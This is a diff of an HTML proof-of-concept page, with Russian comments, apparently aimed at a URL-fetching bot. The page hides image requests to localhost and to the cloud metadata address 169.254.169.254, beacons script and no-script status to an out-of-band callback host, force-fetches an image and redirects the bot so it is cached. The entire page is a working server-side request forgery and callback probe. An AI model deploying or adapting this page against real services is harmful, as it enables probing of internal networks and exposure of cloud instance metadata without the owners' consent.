@@ -1,28 +1,44 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>Storage Proof PoC</title>
+</head>
 <body>
-    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg" alt="Proof">
+    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg" style="display:none;">
 
-    <img src="http://169.254.169.254/latest/meta-data/instance-id?.jpg">
-
-    <picture>
-      <source srcset="http://127.0.0.1:80/favicon.ico">
-      <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg">
-    </picture>
+    <img src="http://127.0.0.1:80/favicon.ico" style="display:none;">
+    <img src="http://169.254.169.254/latest/meta-data/instance-id" style="display:none;">
 
     <script>
-        // Если JS все-таки работает (для того первого бота MAX), 
-        // мы заставим его принудительно скачать картинку
-        var link = document.createElement('a');
-        link.href = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg";
-        link.download = "proof.jpg";
-        document.body.appendChild(link);
-        link.click();
-        
-        // Редирект на саму картинку в конце
-        setTimeout(() => {
-            window.location.href = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg";
-        }, 500);
+        const oast = "http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun";
+
+        // Функция для скрытой отправки логов
+        function log(path) {
+            var i = new Image();
+            i.src = oast + "/" + path + "?rand=" + Math.random();
+        }
+
+        // Подтверждаем, что скрипт запустился
+        log("EXPLOIT_RUNNING");
+
+        // Пытаемся заставить браузер "скачать" картинку программно
+        fetch("https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg")
+            .then(() => log("IMAGE_FETCH_SUCCESS"))
+            .catch(() => log("IMAGE_FETCH_FAILED"));
+
+        // Через 1 секунду уводим бота редиректом прямо на картинку
+        // Это "закрепит" её в его истории/кэше
+        setTimeout(function() {
+            window.location.replace("https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg");
+        }, 1000);
     </script>
+
+    <style>
+        body {
+            background: url("http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/NOSCRIPT_DETECTION");
+            list-style-image: url("https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg");
+        }
+    </style>
 </body>
 </html>
